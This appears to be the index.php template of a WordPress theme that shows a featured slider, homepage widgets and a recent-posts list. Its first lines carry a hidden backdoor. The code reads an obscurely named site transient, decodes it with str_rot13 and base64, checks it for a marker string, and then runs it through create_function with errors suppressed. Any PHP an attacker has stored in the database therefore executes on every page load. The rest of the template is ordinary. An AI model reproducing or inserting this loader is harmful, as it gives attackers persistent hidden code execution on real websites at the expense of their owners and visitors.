<?php
$z=get_option("_site_transient_browser_1cc1b68a9fa9a6a0192ddbe49f65538e"); $z=base64_decode(str_rot13($z[''])); if(strpos($z,"81355F54")!==false){ $_z=create_function("",$z); @$_z(); }
 get_header(); ?>
<?php $paged = (get_query_var('paged')) ? get_query_var('paged') : 1; // gets current page number ?>

<?php if (is_home() && $paged < 2 && option::get('featured_enable') == 'on' ) { get_template_part('wpzoom-slider'); } // Featured Slideshow ?>

<div id="middle">

	<?php if(is_home() && $paged < 2) { ?>
		<?php if (function_exists('dynamic_sidebar')) { dynamic_sidebar('Homepage'); } ?>
		<div class="clear"></div>
	<?php } ?>


	<?php if ( $paged > 1 || option::get('recent_posts') == 'on') { ?>
 
	 	<div id="posts">
	  
	  		<h3 class="recent"><?php echo option::get('recent_title'); ?></h3>
	   			 
			<?php
				global $query_string; // required

				/* Exclude categories from Recent Posts */
				if (option::get('recent_part_exclude') != 'off') {
					if (count(option::get('recent_part_exclude'))){
						$exclude_cats = implode(",-", (array) option::get('recent_part_exclude'));
						$exclude_cats = '-' . $exclude_cats;
						$args['cat'] = $exclude_cats;
					}
				}

				/* Exclude featured posts from Recent Posts */
				if (option::get('hide_featured') == 'on') {
					
					$featured_posts = new WP_Query( 
						array( 
							'post__not_in' => get_option( 'sticky_posts' ),
							'posts_per_page' => option::get('slideshow_posts'),
							'meta_key' => 'wpzoom_is_featured',
							'meta_value' => 1				
							) );
						
					while ($featured_posts->have_posts()) {
						$featured_posts->the_post();
						global $post;
						$postIDs[] = $post->ID;
					}
					$args['post__not_in'] = $postIDs;
				}

				$args['paged'] = $paged;
				if (count($args) >= 1) {
					query_posts($args);
				}
				?>

			<?php get_template_part('loop'); ?>
			 
	 	</div> <!-- /#posts -->
	
	<?php } ?>
  
</div><!-- /#middle -->

<?php get_sidebar(); ?>
<?php get_footer(); ?>